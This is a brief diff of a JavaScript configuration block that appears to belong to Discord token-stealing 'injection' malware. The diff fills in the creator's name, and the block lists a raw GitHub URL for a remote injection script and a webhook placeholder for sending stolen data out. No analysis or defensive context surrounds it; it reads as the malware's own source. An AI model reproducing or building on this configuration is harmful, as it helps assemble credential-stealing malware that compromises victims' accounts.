@@ -17,7 +17,7 @@ var config = {
     "init-notify": "true",
     "embed-color": 2895667,
 
-    creator: "%NAME_CREATOR%",
+    creator: "Ayhu",
     transfer_link: `%TRANSFER_URL%`,
     injection_url: "https://raw.githubusercontent.com/Ayhuuu/injection/main/inj.js",
     webhook: "%WEBHOOK%",
